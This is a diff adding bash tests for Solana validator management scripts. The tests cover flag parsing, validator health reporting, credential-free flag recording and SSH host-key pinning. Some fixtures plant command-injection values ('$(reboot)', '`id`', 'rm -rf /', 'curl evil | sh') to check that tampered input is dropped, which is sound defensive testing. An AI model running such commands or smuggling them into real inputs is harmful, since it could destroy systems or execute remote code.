@@ -1294,6 +1294,31 @@ group "CLI validation"
   it "arise rejects an unknown flag"
   assert_contains "$(arise --nonsense)" "Unknown option"
 
+  # A value flag given last used to die on "$2: unbound variable" under set -u
+  for script in arise.sh ascend.sh reawaken.sh system.sh; do
+    case "$script" in
+      ascend.sh)   mode="upgrade" ;;
+      reawaken.sh) mode="status" ;;
+      *)           mode="" ;;
+    esac
+    it "$script names the flag that is missing its value"
+    # shellcheck disable=SC2086
+    out=$( (cd "$ROOT" && ./"$script" $mode --host) 2>&1 )
+    assert_contains "$out" "--host requires a value"
+    it "$script does not hit an unbound variable on a flag with no value"
+    assert_not_contains "$out" "unbound variable"
+
+    it "$script --help exits 0 and prints usage"
+    out=$( (cd "$ROOT" && ./"$script" --help) 2>&1 ); rc=$?
+    assert_eq "$rc" "0"
+    it "$script --help shows the usage text"
+    assert_contains "$out" "Usage:"
+    it "$script exits 1 on an unknown flag"
+    # shellcheck disable=SC2086
+    (cd "$ROOT" && ./"$script" $mode --nonsense) >/dev/null 2>&1; rc=$?
+    assert_eq "$rc" "1"
+  done
+
   # Printed commands are copy-pasted against real hosts. Without IdentitiesOnly
   # the agent offers every loaded key and can trip the server's MaxAuthTries.
   it "printed ssh commands carry the key and IdentitiesOnly"
@@ -2837,6 +2862,346 @@ group "client switch (arise.sh on a live host)"
 
   it "a dry run says what --restart would do"
   assert_contains "$(arise "${sw_base[@]}" --dry-run --restart)" "[DRY RUN] --restart: if a validator is running, would wait for a restart window"
+fi
+
+if should_run "health"; then
+group "validator health in system.sh"
+  # shellcheck source=../lib/hexis.sh
+  source "${ROOT}/lib/hexis.sh"
+  # shellcheck source=../lib/firedancer.sh
+  source "${ROOT}/lib/firedancer.sh"
+
+  # Run the generated host lines here. curl is a stub that answers each RPC
+  # method with the file of that name, and nothing when there is none.
+  hc="$(mktemp -d)"; mkdir "$hc/bin" "$hc/rpc"
+  cat > "$hc/bin/curl" <<'STUB'
+#!/usr/bin/env bash
+while [[ $# -gt 0 ]]; do [[ "$1" == "-d" ]] && body="$2"; shift; done
+method=$(sed -n 's/.*"method":"\([A-Za-z]*\)".*/\1/p' <<<"$body")
+printf '%s\n' "$body" >> "$HC_RPC/requests"
+[[ -f "$HC_RPC/$method" ]] && cat "$HC_RPC/$method"
+exit 0
+STUB
+  chmod +x "$hc/bin/curl"
+  HC_ID="DenT1ty111111111111111111111111111111111111"
+  HC_VOTE="7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2"
+  hc_run() { ( export HC_RPC="$hc/rpc"; PATH="$hc/bin:$PATH"; eval "$(host_health_cmd 8899 "${1-$HC_ID}" "${2-$HC_VOTE}")" ) 2>&1; }
+  hc_set() { printf '%s\n' "$2" > "$hc/rpc/$1"; }
+  hc_healthy() {
+    rm -f "$hc/rpc/"*
+    hc_set getHealth '{"jsonrpc":"2.0","result":"ok","id":1}'
+    hc_set getEpochInfo '{"jsonrpc":"2.0","result":{"absoluteSlot":300001000,"epoch":700,"slotIndex":1000,"slotsInEpoch":432000},"id":1}'
+    hc_set getLeaderSchedule "{\"jsonrpc\":\"2.0\",\"result\":{\"$HC_ID\":[100,101,102,103,2500,2501,2502,2503]},\"id\":1}"
+    hc_set getVoteAccounts "{\"jsonrpc\":\"2.0\",\"result\":{\"current\":[{\"votePubkey\":\"$HC_VOTE\",\"nodePubkey\":\"$HC_ID\",\"activatedStake\":123456789000000,\"lastVote\":300000998}],\"delinquent\":[]},\"id\":1}"
+  }
+
+  hc_healthy
+  out=$(hc_run)
+  it "a healthy node is caught up"
+  assert_contains "$out" "behind=0"
+  it "the next leader slot is counted from where the epoch is now"
+  assert_contains "$out" "leader_in=1500"
+  it "leader slots already past are not counted as left"
+  assert_eq "$(grep -E '^leader_(total|left)=' <<<"$out" | paste -sd' ' -)" "leader_total=8 leader_left=4"
+  it "the vote account is voting, with its lag and stake"
+  assert_eq "$(grep -E '^(vote|vote_lag|stake_sol|vote_here)=' <<<"$out" | paste -sd' ' -)" "vote=current vote_lag=2 stake_sol=123456 vote_here=yes"
+  it "the epoch and how far through it is are given"
+  assert_eq "$(grep -E '^epoch' <<<"$out" | paste -sd' ' -)" "epoch=700 epoch_pct=0"
+  it "the leader schedule is asked for this identity only"
+  assert_contains "$(cat "$hc/rpc/requests")" "\"method\":\"getLeaderSchedule\",\"params\":[null,{\"identity\":\"$HC_ID\"}]"
+  it "and the vote accounts for this vote account only"
+  assert_contains "$(cat "$hc/rpc/requests")" "\"votePubkey\":\"$HC_VOTE\""
+
+  hc_set getHealth '{"jsonrpc":"2.0","error":{"code":-32005,"message":"Node is behind by 42 slots","data":{"numSlotsBehind":42}},"id":1}'
+  it "a node that is behind says by how many slots"
+  assert_contains "$(hc_run)" "behind=42"
+
+  hc_set getHealth '{"jsonrpc":"2.0","error":{"code":-32005,"message":"Node is unhealthy","data":{}},"id":1}'
+  it "a node that is unhealthy without a number says so"
+  assert_contains "$(hc_run)" "behind=unknown"
+
+  hc_healthy
+  hc_set getVoteAccounts "{\"jsonrpc\":\"2.0\",\"result\":{\"current\":[],\"delinquent\":[{\"votePubkey\":\"$HC_VOTE\",\"nodePubkey\":\"0therNode1111111111111111111111111111111111\",\"activatedStake\":5000000000,\"lastVote\":299990000}]},\"id\":1}"
+  out=$(hc_run)
+  it "a delinquent vote account is reported as that"
+  assert_contains "$out" "vote=delinquent"
+  it "a vote account that votes through another identity is told apart"
+  assert_contains "$out" "vote_here=no"
+
+  hc_set getVoteAccounts '{"jsonrpc":"2.0","result":{"current":[],"delinquent":[]},"id":1}'
+  it "a vote account the node does not know is absent"
+  assert_contains "$(hc_run)" "vote=absent"
+
+  hc_set getLeaderSchedule '{"jsonrpc":"2.0","result":{},"id":1}'
+  out=$(hc_run)
+  it "an identity with no leader slots has none"
+  assert_contains "$out" "leader_total=0"
+  it "and no next one"
+  assert_not_contains "$out" "leader_in="
+
+  hc_healthy
+  out=$(hc_run "" "")
+  it "with no identity or vote account, sync is still read"
+  assert_contains "$out" "behind=0"
+  it "and nothing is said about leader slots or votes"
+  assert_not_contains "$out" "leader_total"
+  assert_not_contains "$out" "vote="
+
+  rm -f "$hc/rpc/"*
+  it "an RPC that does not answer is down, and nothing else is said"
+  assert_eq "$(hc_run)" "rpc=down"
+
+  hc_set getHealth '<html>502 Bad Gateway</html>'
+  it "an answer that is not JSON counts as down"
+  assert_eq "$(hc_run)" "rpc=down"
+
+  hc_healthy
+  hc_set getEpochInfo '{"result":{"slotIndex":"$(reboot)","slotsInEpoch":[],"epoch":"x"}}'
+  hc_set getVoteAccounts '{"result":{"current":["junk",{"lastVote":"x","activatedStake":null,"nodePubkey":7}]}}'
+  out=$(hc_run)
+  it "answers of the wrong shape are left out, not printed"
+  assert_not_contains "$out" "reboot"
+  it "and do not stop what could be read"
+  assert_contains "$out" "behind=0"
+
+  # system.sh, with the host's answers stubbed
+  hl_host() {   # <health answer> <extra facts>
+    printf '%s\n' '*echo ok*|ok' \
+      "*system-facts*|agave_active=active\\nfd_enabled=disabled\\nfd_release=\\nfd_config=no$2" \
+      "*key-info*|/home/sol/identity.json|/home/sol/staked_identity.json|$HC_ID" \
+      "*host-health*|$1" \
+      "*cat /home/sol/validator.sh*|#!/bin/bash\\nexec agave-validator \\\\\\\\\\n    --identity /home/sol/identity.json \\\\\\\\\\n    --vote-account $HC_VOTE \\\\\\\\\\n    --rpc-port 8899 \\\\\\\\\\n    --accounts /mnt/accounts \\\\\\\\\\n    --block-engine-url https://ny.mainnet.block-engine.jito.wtf \\\\\\\\\\n    --ledger /mnt/ledger"
+  }
+  hl=(--host 1.2.3.4 --ssh-key "$WORK/key")
+  hl_host 'rpc=up\nbehind=0\nepoch=700\nepoch_pct=61\nleader_total=1200\nleader_left=340\nleader_in=1800\nvote=current\nvote_lag=2\nstake_sol=123456\nvote_here=yes' \
+    '\nagave_since=273600\ndisk_ledger=61% 1.2T\ndisk_accounts=40% 800G\ndisk_root=20% 150G\nclock_synced=yes\nreboot_required=yes\nperch_active=active' > "$WORK/hl-ok.responses"
+  out=$(STUB_RESPONSES="$WORK/hl-ok.responses" STUB_LOG="$WORK/hl-ok.log" system "${hl[@]}")
+
+  it "system.sh shows which key the identity link points at, and its pubkey"
+  assert_contains "$out" "Identity:        /home/sol/identity.json -> /home/sol/staked_identity.json  $HC_ID"
+  it "and that this is the node the vote account votes through"
+  assert_contains "$out" "this is the voting node"
+  it "system.sh says the node is caught up and for how long it has run"
+  assert_contains "$out" "Sync:            caught up, running for 3d 4h"
+  it "system.sh shows the vote account's state, lag and stake"
+  assert_contains "$out" "Vote account:    voting ($HC_VOTE), last vote 2 slots back, 123456 SOL active stake"
+  it "system.sh turns slots until the next leader slot into time"
+  assert_contains "$out" "Leader slots:    next in about 12m; 340 left of 1200 this epoch   (epoch 700, 61% through)"
+  it "system.sh shows how full the ledger, accounts and root disks are"
+  assert_contains "$out" "Disks:           ledger 61% used, 1.2T free   accounts 40% used, 800G free   / 20% used, 150G free"
+  it "system.sh shows clock sync, a pending reboot and perch"
+  assert_contains "$out" "Host:            clock synchronised, a reboot is pending (package updates), perch is watching"
+  it "the health check asks the RPC port validator.sh names, for this identity and vote account"
+  assert_contains "$(cat "$WORK/hl-ok.log")" "port='8899'; identity='$HC_ID'; vote='$HC_VOTE'"
+  it "the moves offered are still there below the health lines"
+  assert_order "$out" "Leader slots:" "From here:"
+
+  hl_host 'rpc=up\nbehind=42\nvote=delinquent\nvote_lag=9000\nvote_here=no\nleader_total=0\nleader_left=0' \
+    '\nclock_synced=no\nreboot_required=no\nperch_active=inactive' > "$WORK/hl-bad.responses"
+  out=$(STUB_RESPONSES="$WORK/hl-bad.responses" system "${hl[@]}")
+  it "system.sh says how many slots behind the node is"
+  assert_contains "$out" "Sync:            42 slots behind"
+  it "system.sh makes a delinquent vote account stand out"
+  assert_contains "$out" "Vote account:    DELINQUENT ($HC_VOTE), last vote 9000 slots back, as this node sees it"
+  it "system.sh says when this host is not the voting node"
+  assert_contains "$out" "this host is not the voting node"
+  it "system.sh says an identity has no leader slots this epoch"
+  assert_contains "$out" "Leader slots:    none this epoch for this identity"
+  it "system.sh says when the clock is not synchronised and perch is not running"
+  assert_contains "$out" "Host:            clock NOT synchronised, perch is not running"
+
+  hl_host 'rpc=down' '' > "$WORK/hl-down.responses"
+  out=$(STUB_RESPONSES="$WORK/hl-down.responses" system "${hl[@]}")
+  it "system.sh says when the RPC does not answer"
+  assert_contains "$out" "Sync:            not read — the RPC on 127.0.0.1:8899 does not answer"
+  it "and prints no disk or host line it has no facts for"
+  assert_not_contains "$out" "Disks:"
+
+  hl_host 'rpc=up\nbehind=$(reboot)\nvote=current\nstake_sol=1;id\nleader_total=`id`' \
+    '\ndisk_ledger=$(reboot) 1T\nagave_since=1;reboot\nclock_synced=$(id)' > "$WORK/hl-hostile.responses"
+  out=$(STUB_RESPONSES="$WORK/hl-hostile.responses" system "${hl[@]}")
+  it "values that are not plain numbers or words are not shown"
+  assert_not_contains "$out" "reboot"
+  it "nor anything else the host put in their place"
+  assert_not_contains "$out" "id\`"
+  it "while the plain ones beside them still are"
+  assert_contains "$out" "Vote account:    voting ($HC_VOTE)"
+fi
+
+if should_run "flags"; then
+group "recorded arise.sh flags"
+  # shellcheck source=../lib/hexis.sh
+  source "${ROOT}/lib/hexis.sh"
+
+  rec=$(arise_flags_record --host 1.2.3.4 --ssh-key /k/id --identity /k/staked.json --root-user root \
+    --vote-account VoTe111 --network mainnet --client jito --jito-version v4.4.1-jito --no-xdp \
+    --hexis --hexis-jup-key SECRETJUP --hexis-metrics-config 'host=https://m,db=d,u=u,p=SECRETPW' \
+    --hexis-binary /local/agave-validator --metrics-config '' --swap-size 64G --restart --dry-run \
+    --perch-label 'my box; rm -rf /' --client-version v4.4.2-jito --commission-bps 500)
+
+  it "flags that describe the host are recorded"
+  assert_contains "$rec" "--vote-account VoTe111"
+  it "a flag with no value is recorded as itself"
+  assert_contains "$rec" "--no-xdp"
+  it "an old flag name is recorded under its current one, and the last value wins"
+  assert_eq "$(grep -c -- '--client-version' <<<"$rec")/$(grep -- '--client-version' <<<"$rec")" "1/--client-version v4.4.2-jito"
+  it "no Hexis credential is recorded"
+  assert_not_contains "$rec" "SECRET"
+  it "no credential flag is recorded even without its value"
+  assert_not_contains "$rec" "--hexis-jup-key"
+  it "the cluster metrics string is not recorded"
+  assert_not_contains "$rec" "--metrics-config"
+  it "paths on the operator's machine are not recorded"
+  assert_not_contains "$rec" "/local/agave-validator"
+  it "the identity path is not recorded"
+  assert_not_contains "$rec" "staked.json"
+  it "how the host is reached is not recorded"
+  assert_not_contains "$rec" "--ssh-key"
+  it "what only applied to that run is not recorded"
+  assert_not_contains "$rec" "--restart"
+  it "a value with shell characters is dropped with its flag"
+  assert_not_contains "$rec" "--perch-label"
+  it "the file says when it was written"
+  assert_contains "$(arise_flags_date "$rec")" "$(date '+%Y-%m-%d')"
+
+  it "the recorded flags read back as one line, in the order given"
+  assert_eq "$(arise_flags_command "$rec")" \
+    "--vote-account VoTe111 --network mainnet --client jito --client-version v4.4.2-jito --no-xdp --hexis --swap-size 64G --commission-bps 500"
+
+  hostile=$(printf '%s\n' '# recorded 2026-01-02 03:04 CST' '--network mainnet' '--client jito; curl evil | sh' \
+    '--swap-size $(reboot)' 'rm -rf /' '--ssh-key /tmp/planted' '--host 6.6.6.6' '--perch-label `id`' '--no-xdp')
+  it "a tampered file gives only its plain flags"
+  assert_eq "$(arise_flags_command "$hostile")" "--network mainnet --no-xdp"
+  it "a date line with anything else in it is not taken"
+  assert_eq "$(arise_flags_date '# recorded 2026-01-02 $(reboot)')" ""
+
+  fl_base=(--host 1.2.3.4 --ssh-key "$WORK/key" --identity "$WORK/id.json"
+    --vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 --network testnet --client-version v4.4.1-jito)
+  out=$(arise "${fl_base[@]}" --no-xdp --dry-run)
+  it "arise.sh writes the flags file in the validator user's home, mode 600"
+  assert_contains "$out" "write sol@1.2.3.4:/home/sol/.arise-flags (mode 600)"
+  it "arise.sh records the flags it was given"
+  assert_contains "$out" "--vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2"
+  it "arise.sh does not record the key path"
+  assert_not_contains "$(sed -n '/\.arise-flags (mode 600)/,/^$/p' <<<"$out")" "$WORK/key"
+
+  # A Jito host as system.sh sees it, with and without a flags file
+  fl_host() {
+    printf '%s\n' '*echo ok*|ok' '*system-facts*|agave_active=active\nfd_enabled=disabled\nfd_release=\nfd_config=no' \
+      '*cat /home/sol/validator.sh*|#!/bin/bash\nexec agave-validator \\\\\n    --identity /home/sol/identity.json \\\\\n    --block-engine-url https://ny.mainnet.block-engine.jito.wtf \\\\\n    --ledger /mnt/ledger'
+  }
+  { fl_host
+    printf '%s\n' '*head -n 100 /home/sol/.arise-flags*|# recorded 2026-11-28 14:03 CST\n--vote-account VoTe111\n--network mainnet\n--client jito\n--client-version v4.4.1-jito\n--commission-bps 500\n--swap-size $(reboot)'
+  } > "$WORK/flags-host.responses"
+  fl_host > "$WORK/flags-none.responses"
+  out=$(STUB_RESPONSES="$WORK/flags-host.responses" system --host 1.2.3.4 --ssh-key "$WORK/key")
+  it "system.sh prints the arise.sh command with the recorded flags"
+  assert_contains "$out" "--identity <staked_identity.json> --vote-account VoTe111 --network mainnet --client jito --client-version v4.4.1-jito --commission-bps 500 --restart"
+  it "system.sh says when they were recorded"
+  assert_contains "$out" "(2026-11-28 14:03 CST)"
+  it "system.sh leaves a tampered line out of the command"
+  assert_not_contains "$out" "reboot"
+
+  out=$(STUB_RESPONSES="$WORK/flags-none.responses" system --host 1.2.3.4 --ssh-key "$WORK/key")
+  it "system.sh keeps the placeholders for a host with nothing recorded"
+  assert_contains "$out" "--vote-account <pubkey> --network <net>"
+  it "and says that the next arise.sh run records them"
+  assert_contains "$out" "records them on the host from its next run on"
+fi
+
+if should_run "hostkey"; then
+group "host key pinning"
+  # shellcheck source=../lib/hexis.sh
+  source "${ROOT}/lib/hexis.sh"
+  # shellcheck source=../lib/remote.sh
+  source "${ROOT}/lib/remote.sh"
+
+  ssh-keygen -q -t ed25519 -N '' -C '' -f "$WORK/hostkey" <<<y >/dev/null 2>&1
+  ssh-keygen -q -t ed25519 -N '' -C '' -f "$WORK/otherkey" <<<y >/dev/null 2>&1
+  HK_FP=$(ssh-keygen -lf "$WORK/hostkey.pub" | awk '{print $2}')
+  OTHER_FP=$(ssh-keygen -lf "$WORK/otherkey.pub" | awk '{print $2}')
+  printf '# 1.2.3.4:22 SSH-2.0-OpenSSH\n1.2.3.4 %s\n' "$(cut -d' ' -f1,2 "$WORK/hostkey.pub")" > "$WORK/scan"
+  pin() { KNOWN_HOSTS_FILE="$1" STUB_KEYSCAN="${3-$WORK/scan}" pin_host_key 1.2.3.4 "$2" 2>&1; }
+
+  it "a host whose scanned key has the fingerprint is added to known_hosts"
+  out=$(pin "$WORK/kh1" "$HK_FP"); rc=$?
+  assert_eq "$rc" "0"
+  it "the key that was added is the scanned one"
+  assert_contains "$(cat "$WORK/kh1")" "$(cut -d' ' -f2 "$WORK/hostkey.pub")"
+
+  it "a key already in known_hosts with the fingerprint needs no scan"
+  out=$(STUB_LOG="$WORK/pin-known.log" pin "$WORK/kh1" "$HK_FP" /nonexistent); rc=$?
+  assert_eq "$rc" "0"
+  it "and the host is not asked for its keys again"
+  assert_file_missing "$WORK/pin-known.log"
+  it "and known_hosts is not added to twice"
+  assert_eq "$(wc -l < "$WORK/kh1" | tr -d ' ')" "1"
+
+  it "a host that offers a different key is refused"
+  out=$(pin "$WORK/kh2" "$OTHER_FP"); rc=$?
+  assert_eq "$rc" "1"
+  it "the refusal names the key the host does offer"
+  assert_contains "$out" "It offers: ${HK_FP}"
+  it "nothing is written to known_hosts for a refused host"
+  assert_file_missing "$WORK/kh2"
+
+  it "a known_hosts entry with another key does not satisfy the fingerprint"
+  out=$(pin "$WORK/kh1" "$OTHER_FP"); rc=$?
+  assert_eq "$rc" "1"
+
+  it "a host that answers with no key is refused"
+  out=$(pin "$WORK/kh3" "$HK_FP" /nonexistent); rc=$?
+  assert_contains "$out" "Could not read a host key"
+  it "with a failing status"
+  assert_eq "$rc" "1"
+
+  it "a fingerprint that is not a SHA256 one is refused"
+  out=$(pin "$WORK/kh3" "MD5:aa:bb:cc"); rc=$?
+  assert_contains "$out" "must look like SHA256:"
+
+  it "system.sh connects to nothing when the fingerprint does not match"
+  out=$(KNOWN_HOSTS_FILE="$WORK/kh4" STUB_KEYSCAN="$WORK/scan" STUB_LOG="$WORK/pin-sys.log" \
+    system --host 1.2.3.4 --ssh-key "$WORK/key" --host-key-fingerprint "$OTHER_FP")
+  assert_contains "$out" "not connecting"
+  it "ssh is never run for it"
+  assert_not_contains "$(grep -v '^ssh-keyscan' "$WORK/pin-sys.log")" "1.2.3.4"
+
+  it "system.sh with a matching fingerprint connects with strict host key checking"
+  KNOWN_HOSTS_FILE="$WORK/kh5" STUB_KEYSCAN="$WORK/scan" STUB_LOG="$WORK/pin-sys-ok.log" \
+    STUB_RESPONSES="$ROOT/test/fixtures/host-hexis.responses" \
+    system --host 1.2.3.4 --ssh-key "$WORK/key" --host-key-fingerprint "$HK_FP" >/dev/null
+  assert_contains "$(cat "$WORK/pin-sys-ok.log")" "StrictHostKeyChecking=yes"
+  it "and never with accept-new"
+  assert_not_contains "$(cat "$WORK/pin-sys-ok.log")" "accept-new"
+
+  for script in ascend reawaken; do
+    mode=upgrade; extra=(--hexis-binary "$WORK/binary")
+    if [[ "$script" == reawaken ]]; then mode=status; extra=(--yes); fi
+    it "$script.sh connects to nothing when the fingerprint does not match"
+    out=$( (cd "$ROOT" && KNOWN_HOSTS_FILE="$WORK/kh-$script" STUB_KEYSCAN="$WORK/scan" STUB_LOG="$WORK/pin-$script.log" \
+      ./"$script".sh "$mode" --host 1.2.3.4 --ssh-key "$WORK/key" "${extra[@]}" \
+      --host-key-fingerprint "$OTHER_FP") 2>&1 )
+    assert_contains "$out" "not connecting"
+    it "$script.sh runs no ssh for it"
+    assert_not_contains "$(grep -v '^ssh-keyscan' "$WORK/pin-$script.log" 2>/dev/null)" "1.2.3.4"
+  done
+
+  it "arise.sh connects to nothing when the fingerprint does not match"
+  out=$(KNOWN_HOSTS_FILE="$WORK/kh-arise" STUB_KEYSCAN="$WORK/scan" STUB_LOG="$WORK/pin-arise.log" \
+    arise --host 1.2.3.4 --ssh-key "$WORK/key" --identity "$WORK/id.json" \
+    --vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 --network testnet --host-key-fingerprint "$OTHER_FP")
+  assert_contains "$out" "not connecting"
+  it "arise.sh runs no ssh for it"
+  assert_not_contains "$(grep -v '^ssh-keyscan' "$WORK/pin-arise.log" 2>/dev/null)" "1.2.3.4"
+
+  it "arise.sh warns when the host is unknown and no fingerprint was given"
+  out=$(KNOWN_HOSTS_FILE="$WORK/kh-empty" arise --host 1.2.3.4 --ssh-key "$WORK/key" --identity "$WORK/id.json" \
+    --vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 --network testnet --dry-run)
+  assert_contains "$out" "is not in known_hosts"
+  it "arise.sh does not warn about a host that is already known"
+  out=$(KNOWN_HOSTS_FILE="$WORK/kh1" arise --host 1.2.3.4 --ssh-key "$WORK/key" --identity "$WORK/id.json" \
+    --vote-account 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 --network testnet --dry-run)
+  assert_not_contains "$out" "is not in known_hosts"
 fi
 
 # ---------------------------------------------------------------------------
